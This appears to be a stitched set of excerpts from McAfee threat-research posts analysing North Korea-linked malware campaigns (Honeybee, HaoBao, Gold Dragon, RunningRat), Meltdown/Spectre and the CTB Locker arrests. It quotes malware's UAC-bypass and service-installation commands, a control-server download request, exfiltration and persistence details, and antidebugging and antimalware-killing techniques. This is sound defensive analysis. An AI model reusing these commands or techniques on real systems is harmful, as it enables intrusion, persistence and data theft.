These connections, combined with the implant’s nearly identical appearance to known variants, are a strong indication that we have uncovered a Hidden Cobra attack. Further, previous implants from 2017 contained bogus documents with financially themed content.
:\/:
A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017). 
:\/:
We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries). In this campaign, we see the adoption of a recent zero-day Adobe Flash vulnerability to get the implant onto the victim’s systems.
:\/:
The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017.

McAfee Advanced Threat Research analysts have discovered a new operation targeting humanitarian aid organizations and using North Korean political topics as bait to lure victims into opening malicious Microsoft Word documents. Our analysts have named this Operation Honeybee, based on the names of the malicious documents used in the attacks.
:\/:
Advanced Threat Research analysts have also discovered malicious documents authored by the same actor that indicate a tactical shift. These documents do not contain the typical lures by this actor, instead using Word compatibility messages to entice victims into opening them.
:\/:
The Advanced Threat Research team also observed a heavy concentration of the implant in Vietnam from January 15–17.
:\/:
 The Korean-language Word document manual.doc appeared in Vietnam on January 17, with the original author name of Honeybee.
:\/:
This malicious document contains a Visual Basic macro that dropped and executed an upgraded version of the implant known as SYSCON, which appeared in 2017 in malicious Word documents as part of several campaigns using North Korea–related topics. The malicious Visual Basic script uses a unique key (custom alphabet) to encode data. We have seen this in previous operations using SYSCON. This key was also used in the Honeybee campaign and appears to have been used since August 2017.
:\/:
Several additional documents surfaced between January 17 and February 3. All contain the same Visual Basic macro code and author name as Honeybee. Some of the malicious documents were test files without the implant. From our analysis, most these documents were submitted from South Korea, indicating that some of the targeting was in South Korea. These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content.
:\/:
We also observed a related malicious document created January 12 by the author Windows User that contained a different encoding key, but essentially used the same macro and same type of implant as we saw with the recent Honeybee documents. This document, “International Federation of Red Cross and Red Crescent Societies – DPRK Country Office,” drops an implant with the control server address 1113427185.ifastnet.org, which resolves to the same server used by the implants dropped in the Honeybee case.
:\/:
Aside from finding the malicious documents, the Advanced Threat Research team discovered a Win32-based executable dropper. This dropper uses a stolen digital signature from Adobe Systems. This certificate is also used by another Korean-language malware compiled January 16 (hash: 35904f482d37f5ce6034d6042bae207418e450f4) with an interesting program database (PDB) path.
:\/:
The malware is a Win32 executable that pretends to be a Word document based on its icon. This is a dropper for the same type of malware as observed with the other Word documents. This sample also dropped a decoy document with the author name Honeybee. This sample, however, contained a bug that interfered with the execution flow of the dropper, suggesting that the authors did not test the malware after code signing it.
:\/:
The Advanced Threat Research team has identified the following persona (snoopykiller@mail.ru) tied to this recent operation. Based on our analysis, the actor registered two free hosting accounts: navermail.byethost3.com, which refers to the popular South Korean search engine, and nihon.byethost11.com. The email address was used to register a free account for a control server in all the implants described in our analysis.
:\/:
The malicious Word file is the beginning of the infection chain and acts as a dropper for two DLL files. The Word file contains malicious Visual Basic macro code that runs when the document is opened in Word using the Document_Open() autoload function. The word file also contains a Base64-encoded file (encoded with a custom key) in it that is read, decoded, and dropped to the disk by the macro.
:\/:
dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass). The DLL contains the following PDB path: 
:\/:
ini: A data file with Base64-encoded data for connecting to an FTP server. Credentials are encoded in the .ini file.
:\/:
dll: The malicious DLL file run as a service (using svchost.exe). The DLL contains the following PDB path: D:\Task\MiMul\FTPCom_vs10\Release\Engine.pdb.
:\/:
The macro then extracts the CAB file into %systemroo%\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts
:\/:
Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections)
:\/:
cmd /c wusa %TEMP%\setup.cab /quiet /extract:%SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe
cmd /c expand %TEMP%\setup.cab -F:* %SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe
:\/:
A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows. UAC bypass via DLL hijacking requires:
:\/:
The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch files contained in the CAB file (which is also dropped to %systemroot%\system32):
:\/:
The batch files involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll. The contents of the batch files vary depending on the OS (x64 vs x86):
:\/:
 error= normal binpath= "%windir%\SysWOW64\svchost.exe -k COMSysApp"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysApp" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\SysWOW64\
:\/:
" /f
sc start COMSysApp
del /f /q %windir%\SysWOW64\install2.bat
del /f /q %windir%\SysWOW64\install1.bat
:\/:
 error= normal binpath= "%windir%\System32\svchost.exe -k COMSysApp"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysApp" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\system32\
:\/:
" /f
sc start COMSysApp
del /f /q %windir%\System32\install1.bat
del /f /q %windir%\System32\install2.bat
:\/:
The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll using:
:\/:
All the following capabilities described are implemented by the malicious service DLL implant unless specified.
:\/:
Another variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same Base64-decoding scheme with a different custom key. This document was created January 10.
:\/:
This variant also consists of two CAB files that are dropped to %temp%, depending on the OS (x86 or x64).
:\/:
Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file
:\/:
exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll may also be either 64-bit or 32-bit.
:\/:
The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern:
:\/:
From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (01-04 11-40-02).txt
:\/:
zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt
:\/:
The service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any files with the keywords:
:\/:
cmd /c chip <string>: Deletes current ipnet.ini config file. Writes new config info (control server connection info) to new ipnet.ini.
:\/:
cmd /c put <new_file_name> <existing_file_name>: Copies existing file to new file name. Deletes existing file.
:\/:
The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer. Furthermore, based on the various metadata in both documents and executables, the actor is likely a Korean speaker.
:\/:
The techniques used in the malicious documents such as the lure messages closely resemble what we have observed before in South Korea. The attacker appears to target those involved in humanitarian aid and inter-Korean affairs. We have seen this operation expand beyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada.
:\/:
Based on the McAfee Advanced Threat Research team’s analysis, we find multiple components from this operation are unique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor. Some new droppers have not been observed before in the wild. The MaoCheng dropper was apparently created specifically for this operation and appeared only twice in the wild.

McAfee Advanced Threat Research (ATR) analysts have discovered an aggressive Bitcoin-stealing phishing campaign by the international cybercrime group Lazarus that uses sophisticated malware with long-term impact.
:\/:
This new campaign, dubbed HaoBao, resumes Lazarus’ previous phishing emails, posed as employee recruitment, but now targets Bitcoin users and global financial organizations. When victims open malicious documents attached to the emails, the malware scans for Bitcoin activity and then establishes an implant for long-term data-gathering.
:\/:
HaoBao targets and never-before-seen implants signal to McAfee ATR an ambitious campaign by Lazarus to establish cryptocurrency cybercrime at a sophisticated level.
:\/:
Beginning in 2017, the Lazarus group heavily targeted individuals with spear phishing emails impersonating job recruiters which contained malicious documents. The campaign lasted from April to October and used job descriptions relevant to target organizations, in both English and Korean language. The objective was to gain access to the target’s environment and obtain key military program insight or steal money. The 2017 campaign targets ranged from defense contractors to financial institutions, including crypto currency exchanges, however; much of this fake job recruitment activity ceased months later, with the last activity observed October 22, 2017.
:\/:
 , McAfee ATR discovered a malicious document masquerading as a job recruitment for a Business Development Executive located in Hong Kong for a large multi-national bank. The document was distributed via a Dropbox account at the following URL:
:\/:
This is the mark of a new campaign, though it utilizes techniques, tactics and procedures observed in 2017. This document had the last author ‘Windows User’ and was created January 16, 2018 with Korean language resources. Several additional malicious documents with the same author appeared between January 16 though January 24, 2018.
:\/:
Victims are persuaded to enable content through a notification claiming the document was created in an earlier version of Microsoft Word. The malicious documents then launch an implant on the victim’s system via a Visual Basic macro.
:\/:
The document (7e70793c1ca82006775a0cac2bd75cc9ada37d7c) created January 24, 2018 drops and executes an implant compiled January 22, 2018 with the name lsm.exe (535f212b320df049ae8b8ebe0a4f93e3bd25ed79). The implant lsm.exe contacted 210.122.7.129 which also resolves to worker.co.kr.
:\/:
The other malicious document ( a79488b114f57bd3d8a7fa29e7647e2281ce21f6) created January 19, 2018 drops the implant (afb2595ce1ecf0fdb9631752e32f0e32be3d51bb); which is 99% similar-to the lsm.exe implant.
:\/:
hxxps://dl.dropboxusercontent.com/content_link/AKqqkZsJRuxz5VkEgcguqNE7Th3iscMsSYvivwzAYuTZQWDBLsbUb7yBdbW2lHos/file?dl=1
:\/:
This implant (csrss.exe) compiled January 15, 2018 contacts an IP address 70.42.52.80 which resolves to deltaemis.com. We identified that this domain was used to host a malicious document from a previous 2017 campaign targeting the Sikorsky program.
:\/:
A third malicious document (dc06b737ce6ada23b4d179d81dc7d910a7dbfdde) created January 19, 2018 drops e8faa68daf62fbe2e10b3bac775cce5a3bb2999e which is compiled January 15, 2018. This implant communicates to a South Korean IP address 221.164.168.185 which resolves to palgong-cc.co.kr.
:\/:
McAfee ATR analysis finds the dropped implants have never been seen before in the wild and have not been used in previous Lazarus campaigns from 2017. Furthermore, this campaign deploys a one-time data gathering implant that relies upon downloading a second stage to gain persistence. The implants contain a hardcoded word “haobao” that is used as a switch when executing from the Visual Basic macro.
:\/:
The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code. The payloads are present as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary launched first and then the decoy document).
:\/:
The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via “Sub AutoOpen()”). The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:
:\/:
Decodes the target file path of the second stage binary payload. This file path is calculated based on the current user’s Temp folder location:
:\/:
Runs the second stage payload using cmd.exe. This is done so that the cmd.exe process exists as soon as the payload is launched. This way a process enumeration tool cannot find the parent process => Smaller footprint.
:\/:
Adds persistence on the system by creating a shortcut in the user’s Startup folder with the correct cmdline arguments:
:\/:
Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user. This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload). The decoy document is again written to the user’s temp directory to the following filename/path:
:\/:
Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden
:\/:
The decoy document is then opened by the malicious VBA Macro and the original malicious document’s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.
:\/:
This activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro aims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened by the user.
:\/:
Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.
:\/:
If the malware does not find this string in its cmdline arguments, it simply quits without going any further.
:\/:
Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection. DLL information.
:\/:
As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:

:\/:
Call the newly loaded DLL image’s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in the malware process.
:\/:
The implant has the capability of gathering data from the victim’s system. The following information will be gathered and sent to the command and control server.
:\/:
The malware appends an indicator (flag) specifying whether the above registry key was found in the user’s registry:
:\/:
This key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control in the HTTP POST request as well (explained in the below).
:\/:
In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:
:\/:
Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:
:\/:
The persistence mechanism of the malware is performed only for the downloaded implant. Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim. This persistence is also performed ONLY if the malware successfully executes the downloaded implant. The malware first tries to update the HKEY_LOCAL_MACHINE registry key.
:\/:
If the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key. Value written to registry to achieve persistence on the endpoint:
:\/:
The techniques, tactics and procedures are very similar to the campaigns that targeted US Defense contractors, US Energy sector, financial organizations and crypto currency exchanges in 2017.
:\/:
The same Windows User author appeared back in 2017 in two malicious documents 비트코인_지갑주소_및_거래번호.doc and 비트코인 거래내역.xls which were involved in crypto currency targeting. Furthermore, one of the implants communicates to an IP address that was involved in hosting malicious job description documents in 2017 involving the Sikorsky military program.
:\/:
McAfee Advanced Threat research determines with confidence that Lazarus is the threat group behind this attack for the following reasons:
:\/:
Contacts an IP address / domain that was used to host a malicious document from a Lazarus previous campaign in 2017
:\/:
Same author appeared in these recent malicious documents that also appeared back in Lazarus 2017 campaigns
:\/:
Uses the same malicious document structure and similar job recruitment ads as what we observed in past Lazarus campaigns
:\/:
In this latest discovery by McAfee ATR, despite a short pause in similar operations, the Lazarus group targets crypto currency and financial organizations. Furthermore, we have observed an increased usage of limited data gathering modules to quickly identify targets for further attacks. This campaign is tailored to identifying those who are running Bitcoin related software through specific system scans.

:\/:
 A new variant of the original file-less implant appeared on Feb. 5, 2018, indicating the attack has resumed. The new variant has the same author and metadata as the original documents discovered in December, as well as a nearly identical implant. A key difference, however, is the attackers leveraged hacked servers is Santiago, Chile. See indicators of compromise for this update at the bottom of this post.
:\/:
 describing a fileless attack targeting organizations involved with the Pyeongchang Olympics. The attack used a PowerShell implant that established a channel to the attacker’s server to gather basic system-level data. What was not determined at that time was what occurred after the attacker gained access to the victim’s system.

:\/:
McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access. We have named these implants, which appeared in December 2017, Gold Dragon, Brave Prince, Ghost419, and Running Rat, based on phrases in their code.
:\/:
On December 24, 2017, our analysts observed the Korean-language implant Gold Dragon. We now believe this implant is the second-stage payload in the Olympics attack that ATR discovered January 6, 2018. The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server. However, this implant required additional modules to be executed to be a fully capable backdoor. In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task. Gold Dragon has a much more robust persistence mechanism than the initial PowerShell implant and enables the attacker to do much more to the target system. Gold Dragon reappeared the same day that the Olympics campaign began.
:\/:
The Gold Dragon malware appears to have expanded capabilities for profiling a target’s system and sending the results to a control server. The PowerShell implant had only basic data-gathering capabilities—such as username, domain, machine name, and network configuration—which are useful only for identifying interesting victims and launching more complex malware against them.
:\/:
Gold Dragon is a data-gathering implant observed in the wild since December 24. Gold Dragon gets its name from the hardcoded domain www.golddragon.com, which we found throughout the samples.
:\/:
This sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload chain. Apart from downloading and executing binaries from the control server, Gold Dragon generates a key to encrypt data that the implant obtains from the system. This URL is not used for control; the encrypted data is sent to the server ink.inkboom.co.kr, which was used by previous implants as early as May 2017.
:\/:
Gold Dragon contains elements, code, and similar behavior to implants Ghost419 and Brave Prince, which we have tracked since May 2017. A DLL-based implant created on December 21 (the same day the first malicious Olympics document appeared) was downloaded by a Gold Dragon variant created December 24. This variant was created three days before the targeted spear phishing email with the second document that was sent to 333 victim organizations. The December 24 variant of Gold Dragon used the control server nid-help-pchange.atwebpages.com, which was also used by a Brave Prince variant from December 21.
:\/:
The first variants of Gold Dragon appeared in the wild in South Korea in July 2017. The original Gold Dragon had the file name 한글추출.exe, which translates as Hangul Extraction and was seen exclusively in South Korea. Five variants of Gold Dragon compiled December 24 appeared heavily during the targeting of the Olympics organizations.
:\/:
Gains debug privileges (“SeDebugPrivilege”) for its own process to read remote memory residing in other processes
:\/:
The malware does not establish persistence for itself but for another component (if it is found) on the system:
:\/:
The malware begins by looking for an instance of the Hangul word processor (HWP) running on the system. (HWP is a Korean word processor similar to Microsoft Word.)
:\/:
If HWP.exe is found running on the system, the malware finds the currently open file in HWP by extracting the file path from the command-line argument passed to HWP.exe
:\/:
The malware reads the contents of 2.hwp and finds an “MZ magic marker” in the file indicated by the string “JOYBERTM”
:\/:
This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:
:\/:
Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint
:\/:
Update itself on endpoint after a separate updater component downloads the update from the control server
:\/:
The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware. Any information gathered from the endpoint is first stored in the following file, encrypted, and sent to the control server:
:\/:
The following information is gathered from the endpoint, stored in the file 1.hwp, and sent to the control server:
:\/:
cmd.exe /c dir C:\DOCUME~1\<username>\Desktop\ >> C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp
:\/:
Once the malware has gathered the required data from the endpoint, it encrypts the data file 1.hwp using the password “www[dot]GoldDragon[dot]com”
:\/:
During the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL:
:\/:
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info>
:\/:
The malware can also download and execute additional components served to it by the control server. The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request:
:\/:
GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin
:\/:
After successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed:
:\/:
The malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products:
:\/:
Brave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, specifically the system profiling and control server communication mechanism. The malware gathers detailed logs about the victim’s configuration, contents of the hard drive, registry, scheduled tasks, running processes, and more. Brave Prince was first observed in the wild December 13, 2017, sending logs to the attacker via South Korea’s Daum email service. Later variants posted the data to a web server via an HTTP post command, in the same way that Gold Dragon does.
:\/:
The Daum variants of Brave Prince gather information from the system and save it to the file PI_00.dat. This file is sent as an attachment to the attacker’s email address. Later variants upload the file to a web server via an HTTP post command. The type of data this implant gathers from the victim’s system:
:\/:
Both variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code. This tool is exclusive to South Korea.
:\/:
Ghost419 is a Korean-language implant that first appeared in the wild December 18, 2017, with the most recent sample appearing two days before the Olympics spear phishing email. The malware can be identified by the hardcoded string and URL parameter passed to the control server. Ghost419 can be traced to a sample created July 29, 2017, that appears to be a much earlier version (without the hardcoded identifier). The July version shares 46% of its code with samples created in late December. This early version implant creates a unique mutex value (kjie23948_34238958_KJ238742) that also appears in a sample from December, with the exception that one digit has changed. Ghost419 is based on Gold Dragon and Brave Prince implants and contains shared elements and code, especially for system reconnaissance functions.
:\/:
The string “WebKitFormBoundarywhpFxMBe19cSjFnG,” part of the upload mechanism, also appears in the Gold Dragon variants of late December 2017.
:\/:
Numerous other similarities are present in addition to system reconnaissance methods; the communication mechanism uses the same user agent string as Gold Dragon.
:\/:
RunningRat is a remote access Trojan (RAT) that operates with two DLLs. It gets its name from a hardcoded string embedded in the malware. Upon being dropped onto a system, the first DLL executes. This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence. The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program. The batch file then attempts to remove itself.
:\/:
The first DLL unpacks a resource file attached to the DLL using a zlib decompression algorithm. The authors of the malware left the debugging strings in the binary, making the algorithm easy to identify. The second DLL is decompressed in memory and never touches the user’s file system; this file is the main RAT that executes. Finally, the first DLL adds the registry key “SysRat,” at SoftWare\Microsoft\Windows\CurrentVersion\Run, to ensure the malware is executed at startup.
:\/:
After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with. This address is hardcoded in the second DLL as 200.200.200.13 and is modified by the first DLL to 223.194.70.136.
:\/:
Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information.
:\/:
The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs.
:\/:
From our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality. Code is included to copy the clipboard, delete files, compress files, clear event logs, shut down the machine, and much more. However, our current analysis shows no way for such code to be executed.
:\/:
McAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over from a larger RAT toolkit.
:\/:
The second DLL employs a few additional antidebugging techniques. One is the use of a custom exception handler and code paths that are designed to generate exceptions.
:\/:
The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime.
:\/:
The PowerShell script first discovered by McAfee ATR was delivered via a spear phishing campaign that used image stenography techniques to hide the first-stage implant. (For more on steganography, see the 
:\/:
The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed. The implants are delivered as a second stage once the attacker gains an initial foothold using fileless malware. Some of the implants will maintain their persistence only if Hangul Word, which is specific to South Korea, is running.
:\/:
With the discovery of these implants, we now have a better understanding of the scope of this operation. Gold Dragon, Brave Prince, Ghost419, and RunningRat demonstrate a much wider campaign than previously known. The persistent data exfiltration we see from these implants could give the attacker a potential advantage during the Olympics.
:\/:
The McAfee Advanced Threat Research (ATR) Team has closely followed the attack techniques that have been named 
:\/:
 throughout the lead-up to their announcement on January 3. In this post, McAfee ATR offers a simple and concise overview of these issues, to separate fact from fiction, and to provide insight into McAfee’s capabilities and approach to detection and prevention.
:\/:
There has been considerable speculation in the press and on social media about the impact of these two new techniques, including which processors and operating systems are affected. The speculation has been based upon published changes to the Linux kernel. McAfee ATR did not want to add to any confusion until we could provide our customers and the general public solid technical analysis.
:\/:
, which allowed ATR to validate our conclusions. For more on McAfee product compatibility, see this business 
:\/:
  and other papers that discuss practical side-channel attacks. The current disclosures build upon such side-channel attacks through the innovative use of speculative execution.
:\/:
Speculative execution has been a feature of processors for at least a decade. Branch speculation is built on the 
:\/:
. In essence, when a branch in execution depends upon a runtime condition, modern processors make a “guess” to potentially save time. This speculatively executed branch proceeds by employing a guess of the value of the condition upon which the branch must depend. That guess is typically based upon the last step of the same branch’s previous execution. The conditional value is cached for reuse in case that particular branch is taken again. There is no loss of computing time if the condition arrives at a new value because the processor must in any event wait for the value’s computation. Invalid speculative executions are thrown away. The fact that invalid speculations are tossed is a key attribute exploited by Meltdown and Spectre.
:\/:
Despite the clearing of invalid speculative execution results without affecting memory or CPU registers, data from the execution may be retained in the processor caches. The retaining of invalid execution data is one of the properties of modern CPUs upon which Meltdown and Spectre depend. More information about the techniques is available on the site 
:\/:
Because these techniques can be applied (with variation) to most modern operating systems (Windows, Linux, Android, iOS, MacOS, FreeBSD, etc.), you may ask, “How dangerous are these?” “What steps should an organization take?” and “How about individuals?” The following risk analysis is based upon what McAfee currently understands about Meltdown and Spectre.
:\/:
There is already considerable activity in the security research community on these techniques. Sample code for two of the three variants was posted by the Graz University (in an appendix of the 
:\/:
, though this code is not yet public. An earlier example of side-channel exploitation based upon memory caches was posted to GitHub in 2016 by one Meltdown-Spectre researcher Daniel Gruss. Despite these details, as of this writing no known exploits have yet been seen in the wild. McAfee ATR will continue to monitor researchers’ and attackers’ interest in these techniques and provide updates accordingly. Given the attack surface of nearly every modern computing system and the relative ease of exploitation, it is highly likely that at least one of the aforementioned variants will be weaponized very quickly.
:\/:
McAfee researchers quickly compiled the public exploit code for Spectre and confirmed its efficacy across a number of operating systems, including Windows, Linux, and MacOS.
:\/:
To assess the potential impact of any vulnerability or attack technique, we must first consider its value to attackers. These exploits are uniquely attractive to malicious groups or persons because the attack surface is nearly unprecedented, the attack vector is relatively new, and the impacts (privilege escalation and leaks of highly sensitive memory) are detrimental. The only naturally mitigating factor is that these exploits require local code execution. A number of third parties have already identified JavaScript as an applicable delivery point, meaning both attacks could theoretically be run from inside a browser, effectively opening an avenue of remote delivery. As always, JavaScript is a double-edged sword, offering a more user-friendly browsing experience, but also offering attackers an increased attack surface in the context of the browser’s executing scripted code.
:\/:
Any technique that allows an attacker to cross virtual machine boundaries is of particular interest, because such a technique might allow an adversary to use a cloud virtual machine instance to attack other tenants of the cloud. Spectre is designed to foster attacks across application boundaries and hence applies directly to this problem. Thus, major cloud vendors have rushed to issue patches and software updates in advance of the public disclosure of these issues.
:\/:
Additionally, both Meltdown and Spectre are exceptionally hard to detect as they do not leave forensic traces or halt program execution. This makes post-infection investigations and attack attribution much more complex.
:\/:
Because we believe that Meltdown and Spectre may offer real-world adversaries significant value, we must consider how they can be used. There is no remote vector to these techniques; an attacker must first deliver code to the victim. To protect against malicious JavaScript, we always urge caution when browsing the Internet. Allow scripting languages to execute only from trusted sites. McAfee Windows Security Suite or McAfee Endpoint Security (ENS) can provide warnings if you visit a known dangerous site. These McAfee products can also provide an alternate script-execution engine that prevents known malicious scripts from executing.  As operating systems are changed to mitigate Meltdown and Spectre, organizations and individuals should apply those updates as soon as possible.
:\/:
Even though we have not seen any malware currently exploiting these techniques, McAfee is currently evaluating opportunities to provide detection within the scope of our products; we expect most solutions to lie within processor and operating system updates. Based on published proofs of concept, we have provided some limited detection under the names OSX/Spectre, Linux/Spectre, and Trojan-Spectre.
:\/:
. Due to the nature of any patch or update, we suggest first applying manual updates on noncritical systems, to ensure compatibility with software that involves the potential use of low-level operating system features. McAfee teams are working to ensure compatibility with released patches where applicable.
:\/:
While the world wonders about the potential impact of today’s critical disclosures, we also see a positive message. This was another major security flaw discovered and communicated by the information security community, as opposed to the discovery or leak of “in the wild” attacks. Will this disclosure have negative aspects? Most likely yes, but the overall effect is more global attention to software and hardware security, and a head start for the good guys on developing more robust systems and architectures for secure computing.

 campaigns. One of the interesting findings was cybercriminals seemed to have a sense of absolute safety when conducting criminal operations. Cybercrime is an area of crime like no other, perceived as low-risk with high returns, which contributes greatly to its rapid growth.
:\/:
CTB Locker, also known as Critroni, is known as one of the largest ransomware families—helping to drive a 
:\/:
 in 2015 as one of the top three ransomware families, and earning a spot as No. 1 just a year later. Operation Tovar, in which law enforcement agencies took down the infrastructure responsible for spreading CryptoLocker, created a need for more malware—CTB Locker and CryptoWall malware families helped to fill the gap.
:\/:
In June 2014, the CTB Locker authors began to advertise the malware family on the underground scene at a cost of $3,000USD, where people could buy the first versions for $1,500USD. The authors also offered an affiliate program, which made CTB Locker infamous. By sharing a percentage of the received ransoms, the affiliates ran the greater risk—because they had to spread the ransomware—but they also enjoyed the higher profits. By using exploit kits and spam campaigns, the malware was distributed all over the world, mostly targeting “Tier 1” countries, those in which the victims could afford to pay and most likely would pay the ransom. Midway through 2015, we gained unique information from an affiliate server that helped us tremendously in the subsequent investigations.
:\/:
Besides the use of an affiliate server in CTB Locker’s infrastructure, two other components complete the setup: a gateway server and a payment server.
:\/:
During 2016, a massive spam campaign struck the Netherlands. Emails in Dutch seemed to originate from one of the largest telco providers. The emails claimed to have the latest bill attached. There was no bill, of course, rather CTB Locker asking for around $400USD of ransom to return files. The grammar and word usage was near perfect—not what we commonly observe—and the names in the email were proof of a well-prepared campaign. More than 200 cases in the Netherlands alone were filed with regards to these infections.
:\/:
With attacks growing in number, the Dutch High Tech Crime Unit began an investigation. The unit approached McAfee’s Advanced Threat Research team to assist in identifying samples and answering questions.
:\/:
Following our research, we were kept updated and were informed that in the early morning of December 14 operation “Bakovia” started. The initial research was on the CTB Locker ransomware but based on information from the U.S. Secret Service, it was determined that the same suspected gang was also linked to distribution of Cerber ransomware—another major family.
:\/:
During the operation in East Romania, six houses were searched whereby the investigators seized a significant amount of hard-drives, laptops, external-storage, crypto-currency mining rigs, and hundreds of SIM cards. Suspects were arrested for allegedly spreading CTB Locker ransomware, and other suspects allegedly responsible for spreading Cerber were arrested at the airport in Bucharest.
:\/:
The law enforcement action emphasizes the value of public-private partnerships and underscores the determination behind the McAfee mantra “Together is power.”
